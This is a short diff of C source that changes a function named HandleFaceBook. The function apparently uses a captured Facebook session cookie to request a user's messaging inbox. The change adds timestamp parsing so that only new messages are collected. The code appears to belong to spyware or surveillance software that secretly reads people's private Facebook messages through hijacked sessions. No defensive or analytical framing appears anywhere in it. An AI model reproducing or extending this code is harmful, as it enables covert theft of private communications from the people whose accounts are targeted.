@@ -166,6 +166,16 @@ DWORD HandleFaceBook(char *cookie)
 		swprintf_s(url, L"/ajax/messaging/async.php?sk=inbox&action=read&tid=%S&__a=1", parser1);
 		parser1 = parser2 + 1;
 
+		parser1 = (BYTE *)strstr((char *)parser1, FB_MESSAGE_TSTAMP_IDENTIFIER);
+		if (!parser1)
+			break;
+		parser1 += strlen(FB_MESSAGE_TSTAMP_IDENTIFIER);
+		memset(tstamp, 0, sizeof(tstamp));
+		memcpy(tstamp, parser1, 10);
+		act_tstamp = atoi(tstamp);
+		if (act_tstamp>2000000000 || act_tstamp <= last_tstamp)
+			continue;
+
 		parser1 = (BYTE *)strstr((char *)parser1, FB_THREAD_AUTHOR_IDENTIFIER);
 		if (!parser1)
 			break;
